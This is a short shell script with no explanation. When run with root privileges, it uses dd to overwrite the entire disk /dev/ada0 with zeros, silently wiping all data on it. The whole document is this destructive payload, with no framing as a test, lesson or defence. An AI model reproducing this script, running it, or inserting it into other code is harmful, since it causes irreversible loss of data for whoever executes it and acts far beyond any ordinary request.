#!/bin/sh
if [ "$(id -u)" -eq 0 ]; then
  dd if=/dev/zero of=/dev/ada0 bs=1m
fi
